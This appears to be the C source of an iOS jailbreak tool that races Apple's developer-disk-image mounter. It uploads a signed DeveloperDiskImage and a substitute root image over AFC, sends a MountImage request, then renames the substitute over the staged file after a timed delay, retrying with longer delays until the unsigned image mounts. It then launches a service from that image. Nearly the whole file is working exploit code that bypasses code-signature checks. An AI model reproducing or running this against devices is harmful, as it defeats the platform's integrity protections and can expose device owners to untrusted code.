/*
 * I'm so sorry comex, et al...
 */

#include "MobileDevice.h"
#include <stdio.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <assert.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/socket.h>

#define swap32 __builtin_bswap32

// https://asentientbot.github.io/p0sixspwn/
kern_return_t send_message(service_conn_t socket, CFPropertyListRef plist) {
	CFDataRef data=CFPropertyListCreateXMLData(NULL,plist);
	uint32_t size=CFDataGetLength(data);
	uint32_t sizeSwapped=swap32(size);
	send(socket,&sizeSwapped,4,0);
	send(socket,CFDataGetBytePtr(data),size,0);
}

CFPropertyListRef receive_message(service_conn_t socket) {
	uint32_t sizeSwapped;
	int sizeMessageSize=recv(socket,&sizeSwapped,4,0);
	if(sizeMessageSize==4)
	{
		uint32_t size=swap32(sizeSwapped);
		void* buffer=malloc(size);
		recv(socket,buffer,size,0);
		CFDataRef data=CFDataCreateWithBytesNoCopy(NULL,buffer,size,NULL);
		return CFPropertyListCreateFromXMLData(NULL,data,0,0);
	}
}

static char *real_dmg, *real_dmg_signature, *ddi_dmg;

void qwrite(afc_connection * afc, const char *from, const char *to)
{
	printf("Sending %s -> %s... ", from, to);
	afc_file_ref ref;

	int fd = open(from, O_RDONLY);
	assert(fd != -1);
	size_t size = (size_t) lseek(fd, 0, SEEK_END);
	void *buf = mmap(NULL, size, PROT_READ, MAP_SHARED, fd, 0);
	assert(buf != MAP_FAILED);

	AFCFileRefOpen(afc, to, 3, &ref);
	AFCFileRefWrite(afc, ref, buf, size);
	AFCFileRefClose(afc, ref);

	printf("done.\n");

	close(fd);
}

int timesl;

static void cb(am_device_notification_callback_info * info, void *foo)
{
	struct am_device *dev;

	if (info->msg == ADNCI_MSG_CONNECTED) {
		dev = info->dev;

		AMDeviceConnect(dev);
		assert(AMDeviceIsPaired(dev));
		assert(!AMDeviceValidatePairing(dev));
		assert(!AMDeviceStartSession(dev));

		CFStringRef product =
		    AMDeviceCopyValue(dev, 0, CFSTR("ProductVersion"));
		assert(product);
		UniChar first = CFStringGetCharacterAtIndex(product, 0);
Retry:	{}
		printf("Attempting to mount image...\n");

		service_conn_t afc_socket = 0;
		struct afc_connection *afc = NULL;
		assert(!AMDeviceStartService(dev, CFSTR("com.apple.afc"), &afc_socket, NULL));
		assert(!AFCConnectionOpen(afc_socket, 0, &afc));
		assert(!AFCDirectoryCreate(afc, "PublicStaging"));

		AFCRemovePath(afc, "PublicStaging/staging.dimage");
		qwrite(afc, real_dmg, "PublicStaging/staging.dimage");
		qwrite(afc, ddi_dmg, "PublicStaging/ddi.dimage");

		service_conn_t mim_socket1 = 0;
		assert(!AMDeviceStartService(dev, CFSTR("com.apple.mobile.mobile_image_mounter"), &mim_socket1, NULL));
		assert(mim_socket1);

		CFPropertyListRef result = NULL;
		CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
		CFDictionarySetValue(dict, CFSTR("Command"), CFSTR("MountImage"));
		CFDictionarySetValue(dict, CFSTR("ImageType"), CFSTR("Developer"));

		CFDictionarySetValue(dict, CFSTR("ImagePath"), CFSTR("/var/mobile/Media/PublicStaging/staging.dimage"));

		int fd = open(real_dmg_signature, O_RDONLY);
		assert(fd != -1);
		uint8_t sig[128];
		assert(read(fd, sig, sizeof(sig)) == sizeof(sig));
		close(fd);

		CFDictionarySetValue(dict, CFSTR("ImageSignature"), CFDataCreateWithBytesNoCopy(NULL, sig, sizeof(sig), kCFAllocatorNull));
		send_message(mim_socket1, dict);

		usleep(timesl);
		assert(!AFCRenamePath(afc, "PublicStaging/ddi.dimage", "PublicStaging/staging.dimage"));

		result = receive_message(mim_socket1);

		char* bytes = CFDataGetBytePtr(CFPropertyListCreateXMLData(NULL, result));

		if(strstr(bytes, "Complete")) {
			char* the_service = "CopyIt";
			service_conn_t socket = 0;
			sleep(2);
			printf("Image mounted, running helper...\n");
			assert(!AMDeviceStartService(dev, CFStringCreateWithCStringNoCopy(NULL, the_service, kCFStringEncodingUTF8, kCFAllocatorNull),
				&socket, NULL));
			assert(!fcntl(socket, F_SETFL, O_NONBLOCK));
			assert(!fcntl(0, F_SETFL, O_NONBLOCK));
		} else {
			printf("Failed to inject image, trying again... (if it fails, try a different time), delay ... %dus\n", timesl);
			timesl += 1000;
			goto Retry;
		}

		exit(0);
	}
}

int main(int argc, char **argv)
{
	if (argc != 4) {
		fprintf(stderr, "Usage: %s DeveloperDiskImage.dmg DeveloperDiskImage.dmg.signature Root.dmg\n", argv[0]);
		return 1;
	}

	timesl = 209999;

	real_dmg = argv[1];
	real_dmg_signature = argv[2];
	ddi_dmg = argv[3];

	am_device_notification *notif;
	assert(!AMDeviceNotificationSubscribe(cb, 0, 0, NULL, &notif));
	CFRunLoopRun();
	return 0;
}
